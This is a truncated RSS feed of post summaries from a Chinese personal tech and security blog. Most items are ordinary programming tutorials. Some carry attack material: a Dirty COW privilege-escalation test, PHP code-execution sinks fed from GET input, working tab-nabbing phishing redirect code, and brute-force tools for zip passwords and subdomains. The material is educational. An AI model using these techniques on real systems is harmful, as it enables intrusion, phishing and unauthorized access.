      <description>0x00 关于cURL  cURL可以使用URL的语法模拟浏览器来传输数据，它支持FTP、FTPS、HTTP、HTTPS、GOPHER、TELNET、DICT、FILE以及LDAP等多种协议。 利用cURL可以实现：HTTPS认证、HTTP POST方法、HTTP PUT方法、FTP上传、keyberos认证、代理服务器、cookies、用户名/密码认证、下载文件断点续传、上传文件断点续传、http代理服务器管道等等。   0x01 pycurl常见方法  创建curl对象   c = pycurl.Curl() #创建一个curl对象    设置请求   c.setopt(pycurl.URL,&amp;quot;http://www.baidu.com&amp;quot;) #指定请求的URL c.setopt(pycurl.CONNECTTIMEOUT, 5) #连接的等待时间，设置为0则不等待 c.setopt(pycurl.TIMEOUT, 5) #请求超时时间 c.setopt(pycurl.USERAGENT,&amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&amp;quot;) #配置User-Agent c.setopt(pycurl.NOPROGRESS, 0) #是否屏蔽下载进度条，非0则屏蔽 c.setopt(pycurl.MAXREDIRS, 5) #指定HTTP重定向的最大数 c.setopt(pycurl.FORBID_REUSE, 1) #完成交互后强制断开连接，不重用 c.setopt(pycurl.FRESH_CONNECT,1) #强制获取新的连接，即替代缓存中的连接 c.setopt(pycurl.DNS_CACHE_TIMEOUT,60) #设置保存DNS信息的时间，默认为120秒 c.setopt(pycurl.HEADERFUNCTION, getheader) #将返回的HTTP HEADER定向到回调函数getheader c.setopt(pycurl.WRITEFUNCTION, getbody) #将返回的内容定向到回调函数getbody c.setopt(pycurl.WRITEHEADER, fileobj) #将返回的HTTP HEADER定向到fileobj文件对象 c.setopt(pycurl.WRITEDATA, fileobj) #将返回的HTML内容定向到fileobj文件对象    部分返回信息   c.</description>
    </item>
    
    <item>
      <title>在vps上搭建Shadowsocks</title>
      <link>http://wyb0.com/posts/vps-set-up-shadowsocks/</link>
      <pubDate>Fri, 10 Mar 2017 10:34:40 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/vps-set-up-shadowsocks/</guid>
      <description>0x00 环境  Ubuntu 14.04.1 LTS
 0x01 安装与配置  reber@localhost:~$ sudo apt-get update reber@localhost:~$ python --version Python 2.7.6 reber@localhost:~$ sudo apt-get install python-gevent python-pip reber@localhost:~$ sudo pip install shadowsocks reber@localhost:~$ vim /home/reber/shadowsocks.json { &amp;quot;server&amp;quot;:&amp;quot;服务器 IP 地址&amp;quot;, # 服务器 IP (IPv4/IPv6) &amp;quot;server_port&amp;quot;:8388, # 监听的服务器端口 &amp;quot;local_address&amp;quot;: &amp;quot;127.0.0.1&amp;quot;, # 本地监听的 IP 地址 &amp;quot;local_port&amp;quot;:1080, # 本地端端口 &amp;quot;password&amp;quot;:&amp;quot;mypassword&amp;quot;, # 密码 #&amp;quot;port_password&amp;quot;: #{ # &amp;quot;40001&amp;quot;: &amp;quot;password1&amp;quot;, # &amp;quot;40002&amp;quot;: &amp;quot;password2&amp;quot;, # &amp;quot;40003&amp;quot;: &amp;quot;password3&amp;quot; #}, #&amp;quot;_comment&amp;quot;: #{ # &amp;quot;40001&amp;quot;: &amp;quot;xiaoming&amp;quot;, # &amp;quot;40002&amp;quot;: &amp;quot;lilei&amp;quot;, # &amp;quot;40003&amp;quot;: &amp;quot;mike&amp;quot; #} &amp;quot;timeout&amp;quot;:300, # 超时时间（秒） &amp;quot;method&amp;quot;:&amp;quot;aes-256-cfb&amp;quot;, # 加密方式 # 若Linux内核在3.</description>
    </item>
    
    <item>
      <title>301重定向</title>
      <link>http://wyb0.com/posts/301-redirect/</link>
      <pubDate>Tue, 07 Feb 2017 10:49:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/301-redirect/</guid>
      <description> 0x00 目的  由于博客更换了域名，原来百度收录的都成了死链，所以做一下301重定向 我使用的是github搭建的博客，都是html的文件，先把html文件都上传到自己的服务器上， 修改dns使原域名指向服务器，让百度收录的链接都能够访问，然后设置301 服务器环境：Ubuntu 14.04.5、Apache2   0x01 开启rewrite模块  $ sudo a2enmod rewrite   0x02 根目录下新建.htaccess：  Options +FollowSymLinks RewriteEngine on RewriteRule ^(.*)$ http://wyb0.com/$1 [L,R=301] # 这里换上新域名   0x03 修改配置文件  # AllowOverride None 改为AllowOverride All $ sudo vim /etc/apache2/apache2.conf &amp;lt;Directory /var/www/&amp;gt; Options FollowSymLinks AllowOverride All Require all granted &amp;lt;/Directory&amp;gt;   0x04 重启Apache  $ sudo /etc/init.d/apache2 restart   </description>
    </item>
    
    <item>
      <title>Ubuntu下部署Gitlab</title>
      <link>http://wyb0.com/posts/ubuntu-set-up-gitlab/</link>
      <pubDate>Mon, 16 Jan 2017 20:18:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-set-up-gitlab/</guid>
      <description>0x00 前期准备  # 环境 Ubuntu 14.04 reber@ubuntu:~/Desktop$ sudo apt-get install openssh-server reber@ubuntu:~/Desktop$ sudo apt-get install openssh-client reber@ubuntu:~/Desktop$ sudo apt-get install git   0x01 安装  reber@ubuntu:~/Desktop$ wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/trusty/main/g/gitlab-ce/gitlab-ce_8.8.0-ce.0_amd64.deb reber@ubuntu:~/Desktop$ sudo dpkg -i gitlab-ce_8.8.0-ce.0_amd64.deb   0x02 配置  reber@ubuntu:~/Desktop$ sudo vim /etc/gitlab/gitlab.rb external_url &#39;http://192.168.188.160:80&#39; ...... gitlab_rails[&#39;time_zone&#39;] = &#39;Asia/Shanghai&#39; gitlab_rails[&#39;gitlab_email_from&#39;] = &#39;xxxxxx@163.com&#39; ...... gitlab_rails[&#39;smtp_enable&#39;] = true gitlab_rails[&#39;smtp_address&#39;] = &amp;quot;smtp.163.com&amp;quot; gitlab_rails[&#39;smtp_port&#39;] = 25 gitlab_rails[&#39;smtp_user_name&#39;] = &amp;quot;xxxxxx@163.com&amp;quot; gitlab_rails[&#39;smtp_password&#39;] = &amp;quot;111111&amp;quot; # 客户端授权密码 gitlab_rails[&#39;smtp_domain&#39;] = &amp;quot;163.</description>
    </item>
    
    <item>
      <title>初识Tornado</title>
      <link>http://wyb0.com/posts/tornado-basis/</link>
      <pubDate>Tue, 03 Jan 2017 18:43:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/tornado-basis/</guid>
      <description>0x00 简介  Tornado是一个用Python写的相对简单的、不设障碍的Web服务器架构,用以处理上万的同时的 连接口,让实时的Web服务通畅起来。虽然跟现在的一些用Python写的Web架构相似,比如Django, 但Tornado更注重速度,能够处理海量的同时发生的流量。   0x01 示例  main.py代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- import tornado.ioloop import tornado.web class IndexHandler(tornado.web.RequestHandler): def get(self): #访问根时触发这个函数 name = self.get_argument(&#39;name&#39;,&#39;wyb&#39;) self.write(&#39;Hello,&#39; + name) self.write(&#39;&amp;lt;br /&amp;gt;&amp;lt;a href=&amp;quot;/login&amp;quot;&amp;gt;login&amp;lt;/a&amp;gt;&#39;) class MyLoginHandler(tornado.web.RequestHandler): def get(self): self.render(&#39;login.html&#39;) #若用户请求/login页面则将login.html发送给客户端，客户会看的一个登陆表单 def post(self): #当用户点击提交按钮是触发这个函数 name = self.get_argument(&#39;name&#39;) #接收表单的name password = self.get_argument(&#39;password&#39;) #接收表单的password self.write(&amp;quot;you name is:%s\nyou password is:%s&amp;quot; % (name,password)) def get_app(): handlers = [ (r&amp;quot;/&amp;quot;,IndexHandler), #代表请求/的都让IndexHandler处理 (r&amp;quot;/login&amp;quot;,MyLoginHandler), #表示请求/login页面的让MyLoginHandler处理 ] app = tornado.</description>
    </item>
    
    <item>
      <title>[转]JS操作cookie方法的封装</title>
      <link>http://wyb0.com/posts/js-package-cookie-function/</link>
      <pubDate>Tue, 27 Dec 2016 11:49:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/js-package-cookie-function/</guid>
      <description>原文链接：http://www.wyzu.cn/2015/0123/107167.html
0x00 实现功能  添加cookie 获取所有cookie 根据名字获取单个cookie的值 移除所有cookie 根据名字移除单个cookie  0x01 封装cookie.js源码  /* * 名称和值传送时必须是经过RUL编码的 * cookie绑定在指定的域名下，非本域无法共享cookie，但是可以是在主站共享cookie给子站 * cookie的名称不分大小写；同时建议将cookie URL编码 * 建议针对cookie设置expires、domain、 path；每个cookie小于4KB **/ (function(global){ function getCookiesObj() { //获得cookie对象 var cookies = {}; if (document.cookie) { var objs = document.cookie.split(&#39;; &#39;); for (var i in objs) { var index = objs[i].indexOf(&#39;=&#39;), name = objs[i].substr(0,index), value = objs[i].substr(index+1,objs[i].length); cookies[name] = value; } } return cookies; } function set(sName,sValue,Opts) { //设置cookie // Opts expires,path,domain,secure if (sName &amp;amp;&amp;amp; sValue) { var cookie = encodeURIComponent(sName)+&#39;=&#39;+encodeURIComponent(sValue); if (Opts) { if (Opts.</description>
    </item>
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>http://wyb0.com/posts/python-cnd-check/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-cnd-check/</guid>
      <description>0x00 什么是CDN  CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容， 运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的 缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点， 你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。   0x01 判断方法  可以查询CNAME记录，每个cdn厂商都有特有的特征串 查看http返回头的头部信息  0x02 代码  首先安装dnspython这个第三方模块：pip install dnspython
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import dns.resolver import urllib2 import urlparse class CdnCheck(object): def __init__(self, url): super(CdnCheck, self).__init__() self.cdninfo() self.url = url self.cnames = [] self.headers = [] def get_cnames(self): # get all cname furl = urlparse.urlparse(self.url) url = furl.</description>
    </item>
    
    <item>
      <title>Python的openpyxl模块</title>
      <link>http://wyb0.com/posts/python-module-openpyxl/</link>
      <pubDate>Fri, 25 Nov 2016 17:44:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-openpyxl/</guid>
      <description>0x00 openpyxl模块  这个模块可以让你读写excel文件   0x01 读取数据  代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- from openpyxl import load_workbook wb = load_workbook(filename=&#39;aa.xlsx&#39;) sheetnames = wb.get_sheet_names() #获得所有表名 print u&amp;quot;存在表：%s&amp;quot; % sheetnames ws = wb.get_sheet_by_name(sheetnames[0]) print u&amp;quot;第一张表表名为：%s&amp;quot; % ws.title #Sheet1 rows = ws.max_row #行数 columns = ws.max_column #列数 print &amp;quot;表%s有%d行%d列&amp;quot; % (ws.title,rows,columns) #10 2 共10行2列 print print u&amp;quot;取部分数据：&amp;quot; print ws[&#39;A1&#39;].value,ws[&#39;B1&#39;].value print ws[&#39;A2&#39;].value,ws[&#39;B2&#39;].value print ws.cell(row=1, column=2).</description>
    </item>
    
    <item>
      <title>AJAX与PHP</title>
      <link>http://wyb0.com/posts/ajax-and-php/</link>
      <pubDate>Wed, 16 Nov 2016 10:37:03 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ajax-and-php/</guid>
      <description>0x00 AJAX与PHP  ajax.html代码如下：
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt; &amp;lt;script&amp;gt; function showHint(str) { var xmlhttp; if (str.length==0) { document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=&amp;quot;&amp;quot;; return; } if (window.XMLHttpRequest) { // IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码 xmlhttp=new XMLHttpRequest(); //创建对象 } else { // IE6, IE5 浏览器执行代码 xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;); } xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) { document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=xmlhttp.responseText; } } xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;./ajax.php?q=&amp;quot;+str,true); xmlhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h3&amp;gt;在输入框中尝试输入字母 a:&amp;lt;/h3&amp;gt; &amp;lt;form action=&amp;quot;&amp;quot;&amp;gt; 输入姓名: &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;txt1&amp;quot; onkeyup=&amp;quot;showHint(this.</description>
    </item>
    
    <item>
      <title>AJAX之XHR请求与响应</title>
      <link>http://wyb0.com/posts/ajax-request-and-response/</link>
      <pubDate>Tue, 25 Oct 2016 11:16:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ajax-request-and-response/</guid>
      <description>0x00 GET请求  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; function loadXMLDoc() { var xmlhttp; if (window.XMLHttpRequest) { //创建对象 xmlhttp = new XMLHttpRequest(); } else { xmlhttp = new ActiveXObjece(&amp;quot;Microsoft.XMLHTTP&amp;quot;); } // readyState改变时，就会触发onreadystatechange事件 // readyState存有XMLHttpRequest的状态，为0-4，4表示请求已完成，且响应已就绪 // status为200代表ok，为404代表未找到页面 xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) { // xmlhttp.responseText获取来自服务器的响应 document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML=xmlhttp.responseText; } } xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;2.html?t=&amp;quot;+Math.random(),true); //GET请求，改变readyState // xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;2.html?name=test&amp;amp;age=23&amp;quot;,true); //GET发送信息 xmlhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;AJAX&amp;lt;/h2&amp;gt; &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;loadXMLDoc()&amp;quot;&amp;gt;Request data&amp;lt;/button&amp;gt; &amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  点击&amp;rdquo;Request data&amp;rdquo;时就会请求服务端的2.</description>
    </item>
    
    <item>
      <title>AJAX初识</title>
      <link>http://wyb0.com/posts/ajax-basis/</link>
      <pubDate>Tue, 25 Oct 2016 00:53:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ajax-basis/</guid>
      <description>0x00 什么是AJAX  AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML
AJAX不是新的编程语言，而是一种使用现有标准的新方法。
AJAX可在不重新加载整个页面的情况下与服务器交换数据从而更新部分网页
 0x01 示例  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;script&amp;gt; function loadXMLDoc() { var xmlhttp; if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari xmlhttp=new XMLHttpRequest(); } else {// code for IE6, IE5 xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;); } xmlhttp.onreadystatechange=function(){ if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) { document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML=xmlhttp.responseText; } } xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;/try/ajax/ajax_info.txt&amp;quot;,true); xmlhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt;&amp;lt;h2&amp;gt;使用 AJAX 修改该文本内容&amp;lt;/h2&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;loadXMLDoc()&amp;quot;&amp;gt;修改内容&amp;lt;/button&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  当点击&amp;rdquo;修改内容&amp;rdquo;后，文本就会改变，但html页面源码没变，只向服务器请求了文本
 0x02 关于XHR  XMLHttpRequest是AJAX的基础，就是它与后台就行交互的</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>http://wyb0.com/posts/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/dirty-cow-vulnerabilities/</guid>
      <description>0x00 测试环境  我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123)   0x01 创建文件  查看文件权限信息，可以看到属主为root，且只读，权限为0404
[reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$   0x02 编译、执行poc  POC保存为a.c，编译为aaa</description>
    </item>
    
    <item>
      <title>代码执行漏洞2</title>
      <link>http://wyb0.com/posts/code-execution-vulnerabilities-2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/code-execution-vulnerabilities-2/</guid>
      <description> 接着上一篇：http://wyb0.com/posts/code-execution-vulnerabilities/
0x00 函数create_function()  php中的函数create_function()可以创建一个匿名函数，其函数原型如下：
string create_function ( string $args , string $code ) 其中$args是函数的参数，$code是函数的内容  若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞
 0x01 示例  示例a.php代码如下：
&amp;lt;?php $test = @$_GET[&#39;test&#39;]; $newfun = create_function(&#39;$a,$b&#39;, $test); $newfun(&#39;1111&#39;,&#39;2222&#39;); ?&amp;gt; 上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test   0x02 函数assert()  这个函数和eval()的作用差不多
&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;   </description>
    </item>
    
    <item>
      <title>利用_blank属性钓鱼</title>
      <link>http://wyb0.com/posts/use-_blank-attribute-to-fish/</link>
      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/use-_blank-attribute-to-fish/</guid>
      <description>0x00 _blank  _blank是html中的标签属性，如&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;, 但若点击HELLO打开的网页1.php中有如下代码：
&amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt;  则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼
 0x01 简单模板  a.html内容如下：   &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;    http://xss.reber-9.com/1.php中1.php内容如下：   &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;    1.php同级下有个钓鱼模板fish.html，内容如下：   &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;This is fishing template!</description>
    </item>
    
    <item>
      <title>准则</title>
      <link>http://wyb0.com/posts/principles/</link>
      <pubDate>Wed, 21 Sep 2016 23:05:57 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/principles/</guid>
      <description> 0x00 创造价值  小鸡问母鸡：可否不用下蛋,带我出去玩啊？母鸡道：不行,我要工作！
小鸡说：可你已经下了这么多蛋了！母鸡意味深长地对小鸡说：一天一个蛋,菜刀靠边站,一月不生蛋,高压锅里见。
存在是因为你创造价值,淘汰是因为你失去价值。过去的价值不代表未来,所以每天都要努力！
 0x01 韬光养晦  毛竹用了4年时间,仅仅长了3厘米,但从第5年开始,以每天30厘米的速度疯狂地生长,仅用6周,就长到了15米。其实,在前面的４年,毛竹将根在土壤里延伸了数百平方米。
做人做事亦是如此,不要担心付出得不到回报,因为这些付出都是为了扎根,等到时机成熟,你会登上别人遥不可及的巅峰。
 0x02 感恩  乞丐：能不能给我一百块钱？
路人：我只有八十块钱。
乞丐：那你就欠我二十块钱吧。
不要总以为是上苍欠你的,老觉得老天爷给的不够多、不够好,不要让贪婪之欲取代了感恩之心。
 0x05 宽容与谦卑  一滴墨汁落在一杯清水里,这杯水立即变色,不能喝了；一滴墨汁融在大海里,大海依然是蔚蓝色的大海。为什么？因为两者的肚量不一样。
不熟的麦穗直刺刺地向上挺着,成熟的麦穗低垂着头。为什么？因为两者的份量不一样。
宽容别人,就是肚量；谦卑自己,就是份量；合起来,就是一个人的质量。
 </description>
    </item>
    
    <item>
      <title>SqlmapApi常用方法封装</title>
      <link>http://wyb0.com/posts/package-sqlmapapi-common-function/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/package-sqlmapapi-common-function/</guid>
      <description>代码如下  #!/usr/bin/env python # -*- coding: utf-8 -*- import threading import requests import json from time import sleep class Sqli(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for AutoSqli&amp;quot;&amp;quot;&amp;quot; def __init__(self, server, target, data=&#39;&#39;, referer=&#39;&#39;, cookie=&#39;&#39;): threading.Thread.__init__(self) self.server = server[0:-1] if server[-1]==&#39;/&#39; else server self.target = target self.data = data self.referer = referer self.cookie = cookie self.taskid = &#39;&#39; self.data def new_task(self): url = &amp;quot;{}/task/new&amp;quot;.format(self.server) self.taskid = json.loads(requests.get(url).text)[&#39;taskid&#39;] if len(self.taskid)&amp;gt;0: print &amp;quot;Create new task,taskid is: %s&amp;quot; % self.</description>
    </item>
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>http://wyb0.com/posts/python-blasting-zip-archive/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-blasting-zip-archive/</guid>
      <description>0x00 代码  多线程爆破加密的zip压缩包
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import optparse import zipfile import threading import Queue queue = Queue.Queue() lock = threading.Lock() result = &#39;&#39; def load_pwd(filename): for line in open(filename,&#39;r&#39;): if line: queue.put(line.strip()) def bruter(zipname,queue): global result zFile = zipfile.ZipFile(zipname) while not queue.empty(): password = queue.get() try: zFile.extractall(pwd=password) # 解压 lock.acquire() print &amp;quot;[Ok] password is: %s&amp;quot; % password lock.release() result = password except: lock.</description>
    </item>
    
    <item>
      <title>Python实现代理</title>
      <link>http://wyb0.com/posts/python-implement-agent/</link>
      <pubDate>Tue, 13 Sep 2016 11:36:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-implement-agent/</guid>
      <description>帮助信息   代码如下  #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;This is a proxy&#39; __author__ = &#39;xxx&#39; import sys import socket import threading import optparse lock = threading.Lock() def locker(msg): lock.acquire() print msg lock.release() def hexdump (src,length=16):#十六进制导出函数 result = [] digits = 4 if isinstance(src,unicode) else 2 for i in xrange(0,len(src),length): s = src[i:i+length] hexa = b&#39; &#39;.join(&amp;quot;[%0*X]&amp;quot; % (digits,ord(x)) for x in s) text = b&#39;&#39;.</description>
    </item>
    
    <item>
      <title>Python封装MySQL类</title>
      <link>http://wyb0.com/posts/python-package-mysql-function/</link>
      <pubDate>Mon, 12 Sep 2016 22:54:28 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-package-mysql-function/</guid>
      <description>0x00 安装  有两种，一个是MySQLdb，一个是pymysql
  下载MySQL-python-1.2.3.win-amd64-py2.7.exe然后安装
 sudo pip install pymysql(推荐，因为py3已经不支持MySQLdb了)  0x01 简单表设计如下  insert into mysql.user(Host,User,Password) values(&#39;%&#39;,&#39;python&#39;,&#39;123456&#39;); drop database if exists python; create database python; use python; drop table if exists msg; create table msg( id int not null auto_increment primary key, ip varchar(40) not null default &#39;127.0.0.1&#39; comment &#39;ip地址&#39;, domain varchar(100) not null default &#39;www.xx.com&#39; comment &#39;域名&#39; ); grant all privileges on python.* to &#39;python&#39;@&#39;%&#39; identified by &#39;123456&#39;; flush privileges;   0x02 MySQLdb封装代码  #!</description>
    </item>
    
    <item>
      <title>Python爆破二级域名</title>
      <link>http://wyb0.com/posts/python-blasting-secondary-domain/</link>
      <pubDate>Mon, 12 Sep 2016 21:31:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-blasting-secondary-domain/</guid>
      <description>参考：https://github.com/lijiejie/subDomainsBrute
帮助信息   代码  #!/usr/bin/env python # -*- coding: utf-8 -*- import dns.resolver import threading import Queue import optparse import sys queue = Queue.Queue() lock = threading.Lock() class GetSubDomain(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for SubDomain&amp;quot;&amp;quot;&amp;quot; def __init__(self, target,queue,outfile): threading.Thread.__init__(self) self.target = target self.queue = queue self.rsv = dns.resolver.Resolver() outfile = target + &#39;.txt&#39; if not outfile else outfile self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;) self.ip_list = [] def _scan(self): while not self.queue.empty(): self.</description>
    </item>
    
    <item>
      <title>Tmux的使用</title>
      <link>http://wyb0.com/posts/tmux-usage/</link>
      <pubDate>Sat, 10 Sep 2016 16:24:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/tmux-usage/</guid>
      <description> 0x00 Tmux的快捷键前缀  Tmux 提供了一个快捷键前缀。当想要使用快捷键时，需要先按下快捷键前缀，然后再按下快捷键。比如想按快捷键c时，你需要：先按ctrl+b，松开后再按c
 0x01 会话   0x02 窗口和窗格   </description>
    </item>
    
    <item>
      <title>POC框架Pocsuite</title>
      <link>http://wyb0.com/posts/poc-framework-pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/poc-framework-pocsuite/</guid>
      <description>0x00 关于Pocsuite  Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。
 0x01 简单介绍  安装  使用pip install pocsuite即可安装   常用参数  -u 指定一个目标url -f 指定一个存放目标url的文件 -r 指定一个存放poc的文件夹 &amp;ndash;report 导出结果到html文件 &amp;ndash;cookie 携带cookie &amp;ndash;referer 修改referer &amp;ndash;user-agent 修改UA  模式  执行一个poc有两种模式  --verify 漏洞验证模式(只是验证，不能更改服务器的东西) --attack 漏洞利用模式  示例  pocsuite -u &amp;ldquo;http://www.xxxx.com&amp;quot; -r poc_path/poc_name.py &amp;ndash;atack   poc编写
 可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类) 此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)  pocsuite -u &amp;ldquo;http://www.xxxx.com&amp;quot; -r poc_path/server/ &amp;ndash;verify   poc的命名规范</description>
    </item>
    
    <item>
      <title>Python实现表单爆破</title>
      <link>http://wyb0.com/posts/python-form-blasting/</link>
      <pubDate>Mon, 05 Sep 2016 23:43:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-form-blasting/</guid>
